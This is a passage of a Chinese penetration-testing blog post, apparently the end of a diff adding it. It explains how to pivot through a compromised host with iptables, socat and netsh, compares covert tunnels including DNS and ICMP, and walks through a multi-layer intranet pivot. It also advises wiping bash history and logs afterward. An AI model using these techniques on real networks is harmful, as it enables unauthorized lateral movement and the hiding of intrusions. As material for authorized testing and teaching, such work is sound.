+<td>~100-680 KB&#x2F;s</td>
+<td>中（可检测）</td>
+<td>文件传输、代理</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="8-iptables-端口转发"><a href="#8-iptables-端口转发" class="headerlink" title="8. iptables 端口转发"></a>8. iptables 端口转发</h2><p>利用已控 Linux 主机做路由跳板，无需额外工具。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启转发</span></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将本机 2222 → 内网 192.168.1.100:22</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 2222 -j DNAT --to-destination 192.168.1.100:22</span><br><span class="line">iptables -t nat -A POSTROUTING -p tcp -d 192.168.1.100 --dport 22 -j MASQUERADE</span><br></pre></td></tr></table></figure>
+
+<p><strong>跨网段转发（双网卡主机）：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># eth0:10.0.0.5(外), eth1:192.168.10.5(内) → 深层 192.168.20.0/24</span></span><br><span class="line">ip route add 192.168.20.0/24 via 192.168.10.1 dev eth1</span><br><span class="line">iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 3389 -j DNAT --to-destination 192.168.20.100:3389</span><br><span class="line">iptables -t nat -A POSTROUTING -d 192.168.20.100 -j MASQUERADE</span><br><span class="line">iptables -A FORWARD -p tcp -d 192.168.20.100 --dport 3389 -j ACCEPT</span><br></pre></td></tr></table></figure>
+
+<p><strong>无 root 替代 — socat：</strong> <code>socat TCP-LISTEN:2222,fork,reuseaddr TCP:192.168.1.100:22</code></p>
+<p><strong>Windows netsh：</strong> <code>netsh interface portproxy add v4tov4 listenport=3389 connectaddress=192.168.1.100 connectport=3389</code></p>
+<hr>
+<h2 id="9-隧道技术全景对比"><a href="#9-隧道技术全景对比" class="headerlink" title="9. 隧道技术全景对比"></a>9. 隧道技术全景对比</h2><table>
+<thead>
+<tr>
+<th>隧道类型</th>
+<th>工具</th>
+<th>协议层</th>
+<th>出网条件</th>
+<th>速度</th>
+<th>隐蔽性</th>
+<th>复杂环境适应性</th>
+<th>推荐场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SSH 转发</td>
+<td>OpenSSH</td>
+<td>L4</td>
+<td>TCP 22</td>
+<td>高</td>
+<td>低</td>
+<td>中</td>
+<td>首选方案，有 SSH 即可</td>
+</tr>
+<tr>
+<td>HTTP(S)</td>
+<td>FRP</td>
+<td>L7</td>
+<td>TCP 80&#x2F;443</td>
+<td>高</td>
+<td>中</td>
+<td>高</td>
+<td>长稳代理、多协议穿透</td>
+</tr>
+<tr>
+<td>TCP 隧道</td>
+<td>Chisel</td>
+<td>L4</td>
+<td>任意 TCP</td>
+<td>高</td>
+<td>中</td>
+<td>高</td>
+<td>快速隧道，无 SSH 时</td>
+</tr>
+<tr>
+<td>SOCKS5 级联</td>
+<td>EW</td>
+<td>L4</td>
+<td>任意 TCP</td>
+<td>中</td>
+<td>中</td>
+<td>高</td>
+<td>多级内网级联</td>
+</tr>
+<tr>
+<td>ICMP 隧道</td>
+<td>ptunnel</td>
+<td>L3</td>
+<td>ICMP</td>
+<td>低</td>
+<td>中</td>
+<td>低</td>
+<td>仅 ICMP 放行</td>
+</tr>
+<tr>
+<td>DNS 隧道</td>
+<td>dnscat2&#x2F;iodine</td>
+<td>L7</td>
+<td>UDP 53</td>
+<td>极低~低</td>
+<td>高</td>
+<td>中</td>
+<td>仅 DNS 放行 &#x2F; 高隐蔽</td>
+</tr>
+<tr>
+<td>路由转发</td>
+<td>iptables</td>
+<td>L3</td>
+<td>无需出网</td>
+<td>高</td>
+<td>高</td>
+<td>低(需root)</td>
+<td>内网横向跳板</td>
+</tr>
+</tbody></table>
+<h3 id="隧道选型决策流程"><a href="#隧道选型决策流程" class="headerlink" title="隧道选型决策流程"></a>隧道选型决策流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">               ┌──────────────────┐</span><br><span class="line">               │ 目标是否可以出网？  │</span><br><span class="line">               └────────┬─────────┘</span><br><span class="line">                        │</span><br><span class="line">           ┌────────────┴────────────┐</span><br><span class="line">           ▼                         ▼</span><br><span class="line">      【可出网】                  【不可出网】</span><br><span class="line">  出网协议是什么？          利用已控边界主机转发</span><br><span class="line">  │    │    │    │        (iptables / EW 级联)</span><br><span class="line">TCP22 TCP80 ICMP DNS</span><br><span class="line">  │    │    │    │</span><br><span class="line">  ▼    ▼    ▼    ▼</span><br><span class="line">SSH  FRP  ptunnel dnscat2</span><br><span class="line">        Chisel       iodine</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="10-实战组合：多层内网穿透"><a href="#10-实战组合：多层内网穿透" class="headerlink" title="10. 实战组合：多层内网穿透"></a>10. 实战组合：多层内网穿透</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">场景：最内层仅 DNS 出网，经过两道隔离</span><br><span class="line">Internet → VPS(FRP) → 边界Web(FRPC+EW) → 内层DB(DNS隧道)</span><br></pre></td></tr></table></figure>
+
+<p><strong>Step 1 — VPS：</strong> <code>./frps -c frps.ini</code></p>
+<p><strong>Step 2 — 边界主机：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.ini        <span class="comment"># 连接 VPS，暴露 SOCKS5</span></span><br><span class="line">./ew -s ssocksd -l 2080   <span class="comment"># 对内开放 SOCKS5 供深层使用</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Step 3 — 深层主机：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dnscat2 --dns server=192.168.1.50,domain=inner.tunnel.local</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="11-稳定性优化"><a href="#11-稳定性优化" class="headerlink" title="11. 稳定性优化"></a>11. 稳定性优化</h2><ul>
+<li><strong>心跳保活：</strong> SSH <code>ServerAliveInterval=60</code>；FRP <code>heartbeat_timeout=30</code></li>
+<li><strong>自动重连：</strong> autossh（SSH）、systemd service &#x2F; supervisor（FRP&#x2F;Chisel）</li>
+<li><strong>流量压缩加密：</strong> SSH <code>-C</code>、FRP <code>use_encryption=true</code>、Chisel 自带加密</li>
+<li><strong>进程守护：</strong> <code>nohup cmd &amp;</code>（临时）、systemd（长稳）</li>
+<li><strong>日志清理：</strong> 操作完成后清理 <code>~/.bash_history</code> 及 <code>/var/log/</code> 相关记录（授权范围内操作请遵循规范）</li>
+</ul>
+<hr>
+<h2 id="12-免责声明"><a href="#12-免责声明" class="headerlink" title="12. 免责声明"></a>12. 免责声明</h2><blockquote>
+<p><strong>本文所述技术仅供授权的安全测试、教学研究及网络运维学习使用。</strong></p>
+<ul>
+<li>未经目标系统所有者明确授权，严禁利用隧道或代理技术对他人网络进行访问、测试或攻击。</li>
+<li>使用者须遵守《中华人民共和国网络安全法》《刑法》第285&#x2F;286条及相关法律法规，违法行为将承担法律责任。</li>
+<li>本文作者不对任何滥用本文技术造成的后果负责。</li>
+<li>授权渗透测试中应遵循最小影响原则，测试完毕后及时清理隧道与日志。</li>
+</ul>
+</blockquote>
+<hr>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://man.openbsd.org/ssh">OpenSSH Manual</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel">Chisel GitHub</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">FRP GitHub</a></li>
+<li><a target="_blank" rel="noopener" href="https://rootkiter.com/EarthWorm/">Earthworm</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/iagox86/dnscat2">dnscat2 GitHub</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/yarrick/iodine">iodine GitHub</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.cs.uit.no/~daniels/PingTunnel/">ptunnel</a></li>
+<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1572/">MITRE ATT&amp;CK T1572 — Protocol Tunneling</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/SQL-injection-out-of-band/" rel="prev" title="SQL注入：OOB外带注入">
+                  <i class="fa fa-angle-left"></i> SQL注入：OOB外带注入
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/CSRF-principle-exploitation-defense/" rel="next" title="CSRF 跨站请求伪造 — 原理、绕过与防御">
+                  CSRF 跨站请求伪造 — 原理、绕过与防御 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
